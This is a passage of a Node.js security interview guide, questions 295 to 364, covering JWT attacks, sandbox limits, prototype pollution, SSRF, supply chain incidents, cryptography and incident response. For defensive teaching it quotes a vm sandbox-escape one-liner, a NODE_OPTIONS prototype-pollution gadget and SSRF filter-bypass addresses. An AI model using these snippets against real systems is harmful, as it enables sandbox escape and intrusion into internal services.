- If you embed JSON in an HTML page inside a `<script>` tag, escape `<` as `<` so `</script>` in the data can't close the tag. Libraries like `serialize-javascript` or `devalue` handle this.

The client side must still render data safely.

## 295: How do you safely embed server data in an HTML page?

```js
const safeJson = JSON.stringify(data).replace(/</g, "\\u003c");
res.send(`<script id="data" type="application/json">${safeJson}</script>`);
```

The client reads it with `JSON.parse(document.getElementById("data").textContent)`. Escaping `<` stops `</script>` or `<!--` in user data from breaking out of the script block. Never use `JSON.stringify` output directly inside HTML without escaping.

## 296: What is a JWT "none" algorithm attack?

A JWT header can say `"alg": "none"`, meaning no signature. Some old libraries accepted these tokens, so an attacker could create any token with an empty signature.

Current libraries reject `none` when a key is provided, but you should always pass `algorithms: ["RS256"]` (or whichever you use) to the verify function. Never use `jwt.decode` to make security decisions.

## 297: What is algorithm confusion in JWT?

If a server expects RS256 but accepts whatever the token header says, an attacker can switch the header to HS256 and sign the token with HMAC using the server's public RSA key as the secret. The public key is public, so the attacker has it. A badly written verify function then uses that same public key as the HMAC secret and the signature checks out.

Fix: pin the expected algorithm, and use key objects of the right type. Libraries like `jose` and current `jsonwebtoken` check that the key type matches the algorithm.

## 298: How do you rotate a JWT signing key without logging everyone out?

1. Create a new key pair with a new `kid`.
2. Publish both public keys in the JWKS.
3. Wait until verifiers have refreshed their JWKS cache.
4. Start signing new tokens with the new key.
5. Wait until all tokens signed with the old key have expired.
6. Remove the old key from the JWKS.

With HS256 and a shared secret, the same idea works: accept both secrets for a while, sign with the new one, then remove the old.

## 299: How do you choose the lifetime of access tokens and sessions?

It's a trade-off between security and convenience:

- Access tokens: 5-15 minutes is common, shorter for high-risk APIs.
- Refresh tokens: days to a few weeks, with rotation, and an absolute max lifetime.
- Web sessions: an idle timeout (for example 30 minutes for banking, days for low-risk apps) and an absolute timeout.
- Admin sessions: shorter, with step-up auth.

Think about what an attacker can do with a stolen token and for how long.

## 300: What would you check in a security review of a new endpoint?

- Is authentication required, and is authorization checked for this specific resource?
- Is every input validated with a schema (body, params, query, headers)?
- Are queries parameterized and scoped to the user or tenant?
- Does the response include only the needed fields?
- Is there rate limiting if it's expensive or sensitive?
- Are errors handled without leaking details?
- Are file paths, URLs and shell commands built safely?
- Are security events logged without secrets?
- Are there tests for unauthorized access?

# Advanced Questions (301-450)

## 301: What are the limits of the Node.js permission model?

It's a seatbelt, not a sandbox. The docs say so directly. Main limits:

- It doesn't protect against malicious code that's already trusted to run with native addons or child processes, if you allowed those.
- File descriptors opened before a check, or passed in, aren't checked again.
- Symbolic links can point outside allowed paths in some cases.
- Permissions apply to the whole process. You can't give one dependency less access than another.
- Before Node 25, network access wasn't covered at all, so data could still be sent out.

It's good for reducing damage from bugs and some supply chain attacks. For untrusted code, use OS-level isolation.

## 302: Why is the vm module not a security boundary?

`vm` runs code in a separate V8 context with its own globals, but in the same process, event loop and heap. Code can often reach the outer context through objects you pass in:

```js
import vm from "node:vm";

vm.runInNewContext("this.constructor.constructor('return process')().exit()");
```

The code also shares CPU and memory, so `while (true) {}` freezes everything (the `timeout` option helps only for sync code). The Node docs say not to use it for untrusted code. `vm2`, a popular wrapper that tried to fix this, was abandoned after repeated sandbox escapes.

## 303: How would you run untrusted user code in a Node.js platform?

Use real isolation, chosen by how much you trust the code:

- **isolated-vm:** separate V8 isolates with their own heap and memory limits, no Node APIs unless you pass them in. Good for small scripts, but it's still the same process, so V8 bugs matter.
- **Separate process** with the permission model, low-privilege user, seccomp, and resource limits.
- **Containers** with strict profiles, no network, read-only file system, CPU and memory limits, and a short lifetime.
- **gVisor or microVMs** like Firecracker for hostile multi-tenant code.
- **WebAssembly** runtimes with only the imports you allow.

Also limit run time, output size and network access, and never give the sandbox your secrets.

## 304: Is WASI a security sandbox in Node.js?

No. The Node docs for `node:wasi` say it doesn't provide the full security guarantees of a sandbox and shouldn't be used to run untrusted code. Preopened directories control file access, but the implementation isn't hardened for that use.

WebAssembly itself has good memory isolation, so dedicated Wasm runtimes like Wasmtime are used for sandboxing. The issue is Node's WASI layer, not Wasm in general.

## 305: How does prototype pollution turn into remote code execution?

Pollution adds properties that code reads later as if they were options. If some code path reads an option that leads to running a command, the attacker controls it. Known "gadgets" include:

- `child_process.spawn` reading `shell`, `env` or `NODE_OPTIONS` from an options object with inherited properties.
- Template engines reading options like `outputFunctionName` or `client` from data objects.
- Libraries building `require()` paths from config.

For example, polluting `Object.prototype.shell` and `Object.prototype.env` with `NODE_OPTIONS=--require /proc/self/environ` has been used in public exploits. Node has since made `child_process` ignore inherited properties for many options, but gadgets in libraries keep appearing.

## 306: What Node.js flags help against prototype pollution?

- `--disable-proto=delete` removes the `Object.prototype.__proto__` accessor, so `obj.__proto__ = ...` no longer changes the prototype. `--disable-proto=throw` throws instead.
- `--frozen-intrinsics` (experimental) freezes built-in objects like `Object.prototype` and `Array.prototype`, so they can't be changed at all.

Freezing intrinsics can break libraries that patch built-ins (polyfills, some APM agents), so test well. `constructor.prototype` paths still work with `--disable-proto`, so keep fixing merge code too.

## 307: How would you freeze Object.prototype in an existing app, and what breaks?

```js
// at the very start of the entry file, before other imports run
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);
```

After this, pollution attempts silently fail (or throw in strict mode). What can break: libraries that add methods to built-in prototypes, polyfills, some testing tools and APM agents that patch functions. Code that assigns properties like `obj.toString = ...` on normal objects will also fail in strict mode because the inherited property is read-only ("override mistake"). Roll it out carefully with tests.

## 308: How do you detect prototype pollution at runtime?

You can check for unexpected own properties on `Object.prototype` periodically or after requests in tests:

```js
const baseline = new Set(Object.getOwnPropertyNames(Object.prototype));

setInterval(() => {
  for (const key of Object.getOwnPropertyNames(Object.prototype)) {
    if (!baseline.has(key))
      logger.error({ key }, "Object.prototype was modified");
  }
}, 60_000).unref();
```

It's mainly a detection signal. Fuzzing your endpoints with `__proto__` and `constructor.prototype` payloads in tests is better for finding the bug before production.

## 309: How do backtracking regex engines cause ReDoS?

V8's Irregexp is a backtracking engine. For a pattern like `^(a+)+$` and input `aaaa...a!`, the engine tries every way to split the `a`s between the inner and outer `+`, and when the `!` causes a failure, it backtracks and tries the next split. The number of splits grows exponentially with input length.

Even "polynomial" patterns like `\s*\s*$` or `.*a.*b` on long inputs can take seconds. Linear-time engines like RE2 avoid this by not backtracking, but they don't support backreferences and lookarounds.

## 310: What is V8's experimental linear regex engine?

V8 has a non-backtracking engine you can enable with `--enable-experimental-regexp-engine`. Then regexes with the `l` flag (`/(a+)+$/l`) use it, and there's also an option to fall back to it automatically after too much backtracking (`--enable-experimental-regexp-engine-on-excessive-backtracks`).

It's experimental and doesn't support all features. In practice most teams use the `re2` npm package or avoid risky patterns instead.

## 311: How would you safely support user-provided regex search?

Don't run user regexes in the main V8 engine. Options:

- Use `re2` (linear time, no catastrophic backtracking).
- Run matching in a worker thread with a hard timeout, and terminate the worker if it takes too long.
- Limit pattern length and input length.
- Better yet, offer plain text or glob search and build the query on the server.

## 312: Explain HTTP request smuggling and how it affects Node apps.

Request smuggling happens when a front-end proxy and the back-end server disagree on where one request ends and the next begins, usually due to conflicting `Content-Length` and `Transfer-Encoding` headers or odd formatting. The attacker hides a second request inside the first, which the back end processes as a separate request, sometimes attached to another user's connection.

Node's HTTP parser (llhttp) is strict and rejects ambiguous requests, and Node has fixed several smuggling CVEs. Don't use `--insecure-http-parser`, keep Node updated, and make sure your proxy normalizes requests and uses HTTP/2 or keeps connections well-defined to the back end.

## 313: What does --insecure-http-parser do and when is it acceptable?

It makes Node's HTTP parser accept invalid HTTP that it would normally reject, like bad characters in headers or some malformed chunked encodings. Some old clients or devices send such requests.

It opens the door to request smuggling and header injection, especially behind proxies. Only use it if you must talk to a broken client you can't change, ideally on a separate service, and never in front of or behind a proxy that parses HTTP differently.

## 314: What was the HTTP/2 Rapid Reset attack?

CVE-2023-44487 (October 2023) abused HTTP/2 stream cancellation: a client opens a stream and immediately sends `RST_STREAM`, over and over. The server does work for each stream but the client's concurrent stream limit is never reached, so one connection can cause a huge load. It was used in record-breaking DDoS attacks.

Node released fixes that limit how many resets are allowed. The general lessons: keep runtimes patched, and usually let an edge proxy or CDN handle HTTP/2 from the internet.

## 315: How do you think about HashDoS in Node.js?

HashDoS is when an attacker sends many keys that collide in a hash table, turning fast O(1) lookups into slow O(n) ones, for example in a JSON body with thousands of crafted keys. V8 uses a random hash seed, which makes precomputed collisions much harder.

Still, body size limits, limits on the number of keys or array items (with schema validation), and `parameterLimit` for URL-encoded bodies (default 1000 in Express) are good protection against "lots of keys" payloads in general.

## 316: How can Buffer misuse leak memory contents?

- `Buffer.allocUnsafe(n)` and `Buffer.allocUnsafeSlow(n)` contain old memory. If you send the buffer without overwriting all of it, you leak data from other requests.
- Small `allocUnsafe` buffers come from a shared pool, so `buf.buffer` (the underlying `ArrayBuffer`) can contain other data. Sending `buf.buffer` instead of `buf` leaks the pool.
- Old code using `new Buffer(number)` had the same issue. That's why it was deprecated.

Use `Buffer.alloc`, `Buffer.from`, and always use `buf.byteOffset`/`buf.byteLength` if you work with the underlying `ArrayBuffer`.

## 317: How do you keep secret keys safer in Node.js memory?

You can't fully protect memory in a JavaScript process, but you can reduce exposure:

- Use `KeyObject` (`crypto.createSecretKey`, `createPrivateKey`) instead of passing raw strings around.
- Use non-extractable Web Crypto keys where possible.
- For private keys, `--secure-heap=n` lets OpenSSL use a protected heap that isn't swapped to disk and has guard pages.
- Avoid copying secrets into many strings (strings are immutable and can't be wiped).
- Don't include secrets in heap snapshots and core dumps you share. Heap snapshots contain everything.
- For high-value keys, use a KMS or HSM so the key never enters the process.

## 318: Why are heap snapshots and core dumps sensitive?

A heap snapshot (`v8.writeHeapSnapshot()`, Chrome DevTools) or a core dump contains all live memory: environment variables, database passwords, session data, user records in caches, private keys and tokens.

Treat them as secret data. Don't upload them to public issues, protect any debug endpoint that creates them, and delete them after use.

## 319: How does Web Crypto in Node differ from node:crypto, and when do you use each?

`crypto.subtle` (Web Crypto) is a standard, promise-based API that works the same in browsers, Node, Deno, Bun and edge runtimes. It supports non-extractable keys and a smaller set of modern algorithms, which helps avoid unsafe choices.

`node:crypto` has more features: streaming hashes and ciphers, scrypt, argon2, X.509 helpers, `timingSafeEqual`, `randomInt`, more algorithms and key formats. Use Web Crypto for code shared across runtimes, and `node:crypto` when you need its extra features.

## 320: How do timing side channels appear beyond string comparison?

- Login: hashing the password only when the user exists makes "user not found" faster. Always hash, using a dummy hash for missing users.
- Lookups by token: a database index lookup by the raw token can leak timing. Look up by a hash of the token, or by an ID part, then compare the secret part in constant time.
- Early returns in permission checks or signature checks.
- Response size differences (compression with secrets and user input together, like the BREACH attack).

```js
const DUMMY_HASH = await argon2.hash("dummy-password");

const user = await findUser(email);
const ok = await argon2.verify(user?.passwordHash ?? DUMMY_HASH, password);
if (!user || !ok)
  return res.status(401).json({ error: "Invalid email or password" });
```

## 321: How would you design a split token for password resets or API keys?

Make the token two parts: a public selector (an ID) and a secret verifier.

1. Generate `selector = randomBytes(9)` and `verifier = randomBytes(32)`.
2. Store `selector` and `sha256(verifier)` in the database.
3. Send `selector.verifier` to the user.
4. On use, look up by `selector` (fast, indexed), hash the verifier, and compare with `timingSafeEqual`.

This avoids timing leaks from the index lookup on the secret, and a database leak doesn't give usable tokens.

## 322: How would you handle password hashing at scale without hurting availability?

- Measure hash time on production hardware and pick parameters you can afford at peak login rate.
- Rate limit login per IP and account, so attackers can't force unlimited hash operations.
- Size the thread pool or use a worker pool (for example `piscina`) dedicated to hashing, so it doesn't block file and DNS operations.
- Consider a separate auth service that can scale on its own.
- Add a queue limit: if too many hashes are waiting, reject quickly with `503` instead of piling up.

## 323: What is the BREACH attack and does it matter for Node APIs?

BREACH works on HTTPS responses that are compressed and that contain both a secret (like a CSRF token) and attacker-controlled input. By watching the size of the compressed responses while changing the input, an attacker can guess the secret byte by byte.

It needs specific conditions (attacker can see traffic sizes and make the victim send many requests). Mitigations: don't put secrets and reflected input in the same compressed response, mask CSRF tokens with a random value per response, or turn off compression for sensitive responses.

## 324: How do you design SSRF protection that's hard to bypass?

Checks on the URL string are easy to bypass (`http://0x7f000001`, `http://[::ffff:127.0.0.1]`, `http://127.1`, DNS names that resolve to private IPs, redirects). A strong design checks at connection time:

```js
import { Agent } from "undici";
import dns from "node:dns";

const agent = new Agent({
  connect: {
    lookup(hostname, options, callback) {
      dns.lookup(hostname, { all: true }, (err, addresses) => {
        if (err) return callback(err);
        const ok = addresses.filter((a) => !isBlocked(a.address)); // isBlocked from a BlockList
        if (ok.length === 0) return callback(new Error("Blocked address"));
        if (options.all) return callback(null, ok);
        callback(null, ok[0].address, ok[0].family);
      });
    },
  },
});

await fetch(url, {
  dispatcher: agent,
  redirect: "manual",
  signal: AbortSignal.timeout(5000),
});
```

Then handle redirects yourself and check each hop, and also block it at the network level with an egress proxy or firewall rules.

## 325: Why is an egress proxy a good SSRF defense?

Code-level checks can have bugs and every library that makes HTTP requests needs them. An egress proxy (like Smokescreen, or a squid/Envoy setup) forces all outgoing traffic from the service through one place that blocks internal ranges and only allows listed domains.

Combine it with network policies so the app can't bypass the proxy. Then even a missed SSRF bug or a malicious package can't reach internal services or the metadata endpoint.

## 326: How do you protect against SSRF in PDF or HTML rendering services?

Headless browsers like Puppeteer render HTML that may include `<img src="http://169.254.169.254/...">`, `<iframe>`, `<link>` or JavaScript that fetches internal URLs, and the output can show the response to the attacker.

- Disable JavaScript if not needed.
- Use request interception to block anything except allowed hosts.
- Run the renderer in an isolated container without access to internal networks or the metadata service.
- Sanitize the HTML input.
- Set timeouts and page size limits.

## 327: Walk through the 2025 npm supply chain incidents and what they taught.

- **September 2025, chalk/debug:** a maintainer was phished with a fake npm 2FA reset email. The attacker published versions of very popular packages (`chalk`, `debug`, `ansi-styles` and others) with code that hijacked crypto wallet transactions in browsers. They were removed within hours.
- **September and November 2025, Shai-Hulud:** a self-spreading worm. Infected packages ran a script that stole npm, GitHub and cloud tokens, published infected versions of other packages the victim maintained, and exposed secrets in public GitHub repos. The second wave hit hundreds of packages.

Lessons: phishing-resistant 2FA for maintainers, no long-lived publish tokens (trusted publishing), lockfiles and delayed adoption of new versions, ignoring install scripts, and limiting secrets on developer machines and CI. npm responded by revoking classic tokens and shortening token lifetimes.

## 328: What is dependency confusion?

If your company uses private packages like `@acme/utils` or an unscoped `acme-utils` from a private registry, an attacker can publish a package with the same name on the public npm registry with a higher version. If your install setup checks the public registry too, it may install the attacker's package.

Fixes: use scoped package names and map the scope to your private registry in `.npmrc` (`@acme:registry=https://npm.acme.internal`), register your scope on npmjs.com so nobody else can use it, and use a registry proxy that doesn't fall back to public for internal names.

## 329: What is lockfile injection?

In a pull request, an attacker changes `package-lock.json` so that an existing package entry points to a different `resolved` URL (their own tarball) with a matching `integrity` hash. Reviewers rarely read lockfile diffs, so it can go unnoticed.

Use tools like `lockfile-lint` in CI to check that every `resolved` URL points to your allowed registry over HTTPS, and look at lockfile changes in PRs from outside contributors.

```bash
npx lockfile-lint --path package-lock.json --allowed-hosts npm --validate-https
```

## 330: How do you limit the damage a malicious dependency can do at runtime?

- Run with least privilege: non-root user, read-only file system, no unneeded cloud permissions.
- Restrict outgoing network traffic to known hosts (egress rules), so stolen data can't be sent out easily.
- Use the permission model to limit file system, child processes and (on Node 25+) network access.
- Keep secrets out of `process.env` where possible, or give each service only its own secrets.
- Split sensitive functions (payments, key management) into separate small services with few dependencies.

## 331: What is SLSA and how does it apply to Node projects?

SLSA (Supply-chain Levels for Software Artifacts) is a framework of levels that describe how trustworthy a build is: builds run on a hosted CI, the build process creates signed provenance, the build platform is hardened, and so on.

For a Node project, that means building and publishing from CI (not laptops), using trusted publishing with provenance on npm, generating provenance for container images (Docker BuildKit and GitHub artifact attestations support this), and checking provenance when you consume artifacts.

## 332: How do you verify the integrity of a container image before deploying?

- Sign images in CI with Sigstore Cosign (keyless with OIDC) or Notation.
- Attach SBOM and provenance attestations.
- In the cluster, use an admission controller (Kyverno, Sigstore policy-controller, or the cloud provider's binary authorization) that only allows images signed by your CI identity.
- Deploy by digest (`image@sha256:...`), not by mutable tags.

This stops someone from pushing a modified image with the same tag.

## 333: How do you approach threat modeling for a Node.js service?

Use a simple, repeatable method:

1. Draw the system: clients, services, data stores, third parties, and the trust boundaries between them.
2. For each part and data flow, ask what can go wrong. STRIDE helps: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.
3. Rank threats by likelihood and impact.
4. Decide on fixes or accept the risk with a reason.
5. Update the model when the design changes.

The most useful part is usually step 1. Many issues become obvious when you draw where data crosses trust boundaries.

## 334: Apply STRIDE to a login endpoint.

- **Spoofing:** credential stuffing, phishing, session theft. Use MFA/passkeys, rate limits, breached password checks.
- **Tampering:** changing the request to log in as another user or skip MFA. Server-side state for MFA steps, signed sessions.
- **Repudiation:** a user denies an action. Audit logs with IP, device and time.
- **Information disclosure:** user enumeration, detailed errors, logging passwords. Same error message, constant-ish timing, redaction.
- **Denial of service:** flooding with hash work, locking accounts on purpose. Rate limiting, queue limits, soft lockouts.
- **Elevation of privilege:** session fixation, mass assignment on signup. Regenerate session IDs, strict input schemas.

## 335: How would you design authentication for a new SaaS product today?

- Use a proven identity provider or library rather than custom crypto: managed (Auth0, Cognito, Clerk, WorkOS, Entra) or self-hosted (Keycloak, Ory, Authentik), or a well-maintained library like Better Auth.
- Offer passkeys first, password + MFA as fallback, and enterprise SSO (OIDC/SAML) for business customers.
- For the web app: server sessions in `__Host-` cookies or the BFF pattern. Short-lived JWTs only between services.
- Rate limiting, breached password checks, step-up auth for sensitive actions, account recovery that's as strong as login.
- Audit logs, session management UI ("your devices"), and alerts for new logins.

## 336: What is DPoP and what problem does it solve?

DPoP (Demonstrating Proof of Possession, RFC 9449) binds an access token to a key pair held by the client. With each request, the client sends a `DPoP` header: a short JWT signed with its private key, containing the HTTP method, URL, a timestamp and a hash of the access token. The token itself includes a thumbprint of the public key.

A stolen token alone is useless, because the attacker doesn't have the private key. It fixes the "bearer token is like cash" problem. It's more complex to implement, so it's mostly used in high-security APIs and financial-grade setups.

## 337: How do you detect refresh token reuse and what do you do?

Store refresh tokens with a family ID and a status. When a token is used, mark it as used and issue a new one in the same family.

```js
const record = await RefreshToken.findOne({ hash: sha256(token) });
if (!record) return deny();
if (record.usedAt || record.revokedAt) {
  await RefreshToken.updateMany(
    { familyId: record.familyId },
    { revokedAt: new Date() },
  );
  await alertSecurity(record.userId, "refresh token reuse");
  return deny();
}
```

Use an atomic update to mark it used, so two parallel refreshes can't both succeed. Some systems allow a short grace period to handle legit retries from flaky networks.

## 338: What JWT header parameters can be abused, and how?

- `alg`: switching to `none` or to HS256 for algorithm confusion.
- `kid`: if used in a file path or SQL query to find the key, it can lead to path traversal or SQL injection. Treat it as untrusted input and look it up in a fixed key set.
- `jku` and `x5u`: URLs to fetch keys from. If the server follows them, an attacker points to their own key set. Never trust key URLs from the token. Use a configured JWKS URL.
- `jwk`: an embedded public key. Never verify with a key that comes inside the token.

## 339: How should JWKS fetching and caching work in a verifier?

- Fetch from a configured URL only (from the issuer's OIDC discovery document).
- Cache keys and refresh in the background or on a schedule.
- When a token has an unknown `kid`, refetch, but rate limit those refetches, so attackers can't make you hammer the auth server with random `kid`s.
- Set timeouts and fail closed if keys can't be fetched.

`jose`'s `createRemoteJWKSet` does most of this with `cooldownDuration` and `cacheMaxAge` options.

## 340: What are the trade-offs of putting roles and permissions inside JWTs?

Pros: services can authorize without extra lookups, which is fast and keeps services independent.

Cons: tokens get big, and changes (removing a role, banning a user) don't take effect until the token expires. Also, every service must agree on what the claims mean.

A middle ground: keep coarse roles or scopes in the token, keep tokens short-lived, and check fine-grained or fast-changing permissions (like "is this user still a member of this org") against a central service or cache.

## 341: How do you design authorization for a complex domain like shared documents?

Use relationship-based access control (ReBAC), like Google Zanzibar. You store relationships as tuples: `doc:123#editor@user:alice`, `doc:123#parent@folder:9`, `folder:9#viewer@group:eng#member`. A rule says "a viewer of the folder is a viewer of the docs in it". Checks become "does user X have relation Y on object Z?".

Tools like OpenFGA, SpiceDB, Permify or Oso implement this. They make "share with a group", inheritance and listing "what can this user see" manageable, at the cost of running another service and keeping it in sync.

## 342: How do you prevent a confused deputy problem between services?

A confused deputy is a service with high privileges that does something on behalf of a caller without checking the caller's rights. For example, a file service that has access to all buckets and takes a bucket name from the request.

- Pass the end user's identity (a token with the user and the tenant) through the call chain, and check permissions in each service based on it.
- Use token exchange (RFC 8693) to get tokens scoped to the next service.
- Give each service only the permissions it needs, not broad shared roles.

## 343: What is SPIFFE and why is it used for service identity?

SPIFFE is a standard for giving workloads identities like `spiffe://example.org/ns/prod/sa/orders`. SPIRE (its implementation) or a service mesh issues short-lived X.509 certificates or JWTs to each workload, after checking which pod or process it is.

Services use these for mTLS and authorization ("only the orders service may call payments"), without long-lived secrets that need manual rotation. Istio and Linkerd use similar identity models under the hood.

## 344: How do you securely store and rotate a master encryption key?

Don't store it in the app. Use a KMS (AWS KMS, Google Cloud KMS, Azure Key Vault) or an HSM, where the key never leaves the hardware and you call `Encrypt`/`Decrypt`/`GenerateDataKey` through APIs with IAM controls and audit logs.

For rotation, enable automatic key rotation in the KMS (old key versions still decrypt old data), and re-wrap data keys with the new version over time. Each encrypted value should store which key version wrapped it.

## 345: How do you handle encryption key rotation for data encrypted in your app?

Store a key ID with each encrypted value, for example `v2:iv:tag:ciphertext`.

1. Add the new key and mark it as current for encryption. Keep old keys for decryption.
2. New writes use the new key.
3. A background job reads old values, decrypts with the old key and encrypts with the new one, in batches.
4. When no data uses the old key, remove it.

With envelope encryption, you usually only rewrap the data keys, which is much faster than re-encrypting all data.

## 346: Why is AES-GCM nonce reuse catastrophic?

In GCM, encrypting two messages with the same key and the same IV (nonce) lets an attacker XOR the ciphertexts to learn the XOR of the plaintexts, and worse, recover the authentication key, which lets them forge messages.

With random 96-bit IVs, the safe limit is about 2^32 messages per key. If you encrypt more than that with one key, rotate keys or use a scheme that's safe with random nonces, like XChaCha20-Poly1305 (available via libsodium bindings) or AES-GCM-SIV.

## 347: What is authenticated encryption and why not use AES-CBC?

Authenticated encryption (AEAD), like AES-GCM or ChaCha20-Poly1305, both hides the data and detects any change to it. AES-CBC only hides the data. Without a separate MAC, attackers can change ciphertexts, and padding oracle attacks can decrypt data by watching error responses.

If you see `aes-256-cbc` in old code, you either need encrypt-then-MAC with HMAC done correctly, or a migration to GCM. Also use the AAD (additional authenticated data) parameter to bind ciphertext to context, like the user ID, so it can't be moved to another record.

```js
cipher.setAAD(Buffer.from(`user:${userId}`));
```

## 348: How do you derive multiple keys from one secret?

Use HKDF with different `info` values. Don't reuse the same key for different purposes (encryption, signing, cookies).

```js
import { hkdfSync } from "node:crypto";

const master = Buffer.from(process.env.MASTER_SECRET, "base64");
const salt = Buffer.from("myapp-v1");
const encKey = Buffer.from(hkdfSync("sha256", master, salt, "encryption", 32));
const macKey = Buffer.from(
  hkdfSync("sha256", master, salt, "webhook-signing", 32),
);
```

HKDF is for high-entropy secrets. For passwords, use a password hash (Argon2, scrypt) instead.

## 349: How does OpenSSL affect Node.js security?

Node bundles OpenSSL (OpenSSL 3.x in current versions) for TLS and crypto. OpenSSL vulnerabilities often mean Node security releases, so you need to update Node when OpenSSL issues are announced, not just your OS package.

OpenSSL 3 also changed defaults: some old algorithms (like MD4, used by old webpack versions) moved to the legacy provider, and very short keys may be rejected. Some distributions build Node against the system OpenSSL instead, and FIPS mode (`--enable-fips`) needs a FIPS-validated OpenSSL build.

## 350: What should you know about FIPS mode in Node.js?

FIPS 140 is a US government standard for crypto modules, required in some government and regulated environments. Node can run with a FIPS provider when built against or configured with a FIPS-validated OpenSSL 3, using `--enable-fips` or `--force-fips`, or `crypto.setFips(true)`.

In FIPS mode, non-approved algorithms (like MD5 for security uses, some curves, or certain key sizes) fail. Test the whole app and dependencies, because some libraries use non-approved algorithms internally. Bcrypt isn't FIPS-approved, while PBKDF2 is.

## 351: How can NODE_OPTIONS be abused by an attacker?

`NODE_OPTIONS` adds command-line flags to every Node process that reads it, including `--require` and `--import`, which load a file before the app starts. If an attacker can set environment variables for a Node process (through prototype pollution reaching `spawn` options, a CI config, a `.npmrc`/`.env` they control, or a compromised parent process), they can run their own code in every Node child.

Defenses: pass an explicit, minimal `env` to child processes, don't let user input reach environment variables, and in locked-down environments check `NODE_OPTIONS` at startup. Node blocks some dangerous flags in `NODE_OPTIONS`, but `--require` and `--import` are allowed.

## 352: How can module resolution be hijacked?

Node looks for packages in `node_modules` folders walking up the directory tree, and in `NODE_PATH`. Attack paths include:

- Writing a malicious `node_modules/<name>` folder in a parent directory or a writable folder that's earlier in the search path.
- Setting `NODE_PATH` or `NODE_OPTIONS=--require`.
- Changing files inside `node_modules` after install (a writable app directory in production).
- Loader hooks (`module.register`) added by a dependency.

That's why production containers should have a read-only file system with app files owned by root and not writable by the app user.

## 353: Why should production app files be read-only for the Node process?

If an attacker gets file write access (path traversal in an upload feature, or limited RCE), a writable app directory lets them change your code or a dependency, and the change runs on the next restart or `require`. With a read-only root file system and files owned by another user, they can't make the compromise permanent.

In Kubernetes, use `readOnlyRootFilesystem: true` and mount a small `emptyDir` for `/tmp` if the app needs scratch space.

## 354: What were Node.js policies and what replaced them?

Policies (`--experimental-policy`) let you list allowed modules with integrity hashes and redirect dependencies. The feature was experimental for years, had bypasses and little use, and was removed from Node (the flag no longer exists in current versions).

The permission model (`--permission`) is the current built-in mechanism, though it limits resources (files, processes, network) instead of which modules load. For code integrity, people rely on lockfile integrity, read-only images, signed images and runtime monitoring.

## 355: How do native addons affect your security posture?

Native addons (`.node` files) run C/C++/Rust code with full process rights. They bypass JavaScript-level protections, including the permission model (that's why they're blocked unless you pass `--allow-addons`). Memory bugs in them can lead to code execution, and they need install-time build scripts or prebuilt binaries downloaded during install.

Prefer pure JavaScript or WebAssembly packages when the performance difference doesn't matter, keep native packages updated, and check where prebuilt binaries come from.

## 356: Are worker threads a security boundary?

No. Workers have their own V8 isolate and event loop, but they share the process, the file system access, the environment variables and native resources. With `SharedArrayBuffer` they can share memory. A malicious worker can do anything the main thread can.

Workers are for parallel CPU work, not for isolating untrusted code. Under the permission model, creating workers needs `--allow-worker`.

## 357: How do you secure the Node.js inspector and diagnostics in production?

- Never start production with `--inspect` on a public interface. Even on localhost, any local process can connect.
- `SIGUSR1` turns on the inspector in a running process on Linux and macOS. Anyone who can send signals to the process can enable it, so container isolation and process ownership matter.
- Under the permission model, the inspector is blocked unless `--allow-inspector` is set.
- Protect diagnostic endpoints (heap snapshots, `/debug`, `/metrics`) with authentication and keep them on an internal port.

## 358: Describe some notable Node.js core vulnerabilities and what they teach.

- **CVE-2024-27980 (BatBadBut):** command injection through `.bat`/`.cmd` arguments on Windows. Lesson: argument escaping is platform-specific.
- **HTTP request smuggling fixes (several CVEs):** llhttp got stricter over time. Lesson: don't use `--insecure-http-parser`, keep Node patched.
- **CVE-2023-44487 (HTTP/2 Rapid Reset):** protocol-level DoS.
- **Permission model bypasses:** several fixes for path traversal and symlinks. Lesson: it's a seatbelt, not a sandbox.
- **Windows path traversal issues** with device names and drive-relative paths in `path.normalize`/`path.join`. Lesson: path checks are tricky across platforms.

Node publishes them in security release blog posts. Reading a few helps you understand real attack surfaces.

## 359: What is the Node.js threat model and why does it matter?

The Node project publishes a threat model (in `SECURITY.md`) that says what Node trusts and what counts as a vulnerability. Node trusts the developer's code, its dependencies, the operating system and the file system. It doesn't trust data coming in from the network (like HTTP requests and DNS replies) when it's handled by Node's own APIs.

So "a malicious dependency can read my files" is not a Node bug. It's expected. Knowing this tells you which protections you must build yourself (dependency control, sandboxing) instead of expecting the runtime to provide them.

## 360: How do you secure Server-Side Rendering frameworks running on Node?

SSR frameworks run server code that's easy to forget is server code:

- Server actions and route handlers are public HTTP endpoints. Each one needs authentication, authorization and input validation, even if the UI only calls it from a protected page.
- Don't rely only on middleware for auth. In March 2025, CVE-2025-29927 let attackers skip Next.js middleware with an `x-middleware-subrequest` header. Check auth near the data too.
- Keep the framework patched. In December 2025, a critical flaw in React Server Components (CVE-2025-55182) allowed unauthenticated remote code execution through crafted requests to server function endpoints, affecting Next.js and other RSC frameworks.
- Be careful with what's serialized to the client (props, server component data). Secrets can leak there.

## 361: How do you protect secrets from leaking into client bundles in full-stack Node apps?

- Use framework conventions: only `NEXT_PUBLIC_*` (Next.js) or `VITE_*` (Vite) env vars go to the browser. Never prefix secrets that way.
- Mark server-only modules with the `server-only` package, so importing them in client code fails the build.
- Don't pass whole objects from server to client components. Pick fields.
- Check the built bundle for secrets in CI (search for key prefixes).

## 362: How do you investigate a suspected compromised npm dependency in your app?

1. Identify the package and versions from the advisory, and check your lockfiles across all repos and images (an SBOM helps).
2. Find where and when it was installed: CI logs, build times, developer machines.
3. Assume secrets available in those environments were stolen: rotate npm, GitHub, cloud and database credentials.
4. Check for persistence: new GitHub workflows, new repos, new SSH keys, new npm versions published from your account.
5. Pin to a known-good version, rebuild images from clean caches, redeploy.
6. Look at network logs for calls to the attacker's domains.
7. Write down the timeline and what to improve.

## 363: Walk through an incident response for a leaked database credential.

1. **Contain:** rotate the credential right away and restrict DB network access if possible. Kill existing sessions from that user.
2. **Assess:** check DB audit logs and query logs for use of the credential from unknown IPs, and what data was accessed.
3. **Eradicate:** find how it leaked (Git commit, log, CI output, laptop) and fix that path.
4. **Recover:** deploy apps with the new credential from a secrets manager.
5. **Notify:** if personal data may have been accessed, involve legal. Laws like GDPR have strict notification deadlines (72 hours to the regulator).
6. **Learn:** postmortem, and add controls like secret scanning and short-lived dynamic credentials (for example Vault database secrets).

## 364: What are dynamic database credentials?

